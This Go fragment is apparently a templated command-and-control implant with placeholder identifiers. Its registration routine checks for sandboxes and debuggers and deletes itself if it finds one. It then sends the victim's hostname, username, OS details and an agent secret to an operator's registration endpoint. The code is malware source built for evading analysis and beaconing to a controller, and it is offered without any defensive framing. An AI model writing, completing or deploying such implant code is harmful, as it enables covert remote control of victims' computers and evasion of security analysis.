func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
	if !a.{AGENT_DISABLE_SANDBOX_FIELD} {
		if a.{AGENT_CHECK_SANDBOX_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("sandbox detected, agent self-deleting")
		}

		if a.{AGENT_CHECK_DEBUGGERS_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("debugger detected, agent self-deleting")
		}
	}

	data := map[string]interface{}{
		"agent_id":         a.{AGENT_ID_FIELD},
		"hostname":         a.{AGENT_HOSTNAME_FIELD},
		"os_info":          a.{AGENT_OSINFO_FIELD},
		"user":             a.{AGENT_USERNAME_FIELD},
		"listener_id":      "web_app_default", // This should match the listener name
		"interactive_capable": true,
		"secret_key":       a.{AGENT_SECRET_KEY_FIELD},
	}

	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
	if err != nil {
		return err
	}

	if resp.Status == "success" {
		return nil
	}

	return fmt.Errorf("registration failed: %s", resp.Status)
}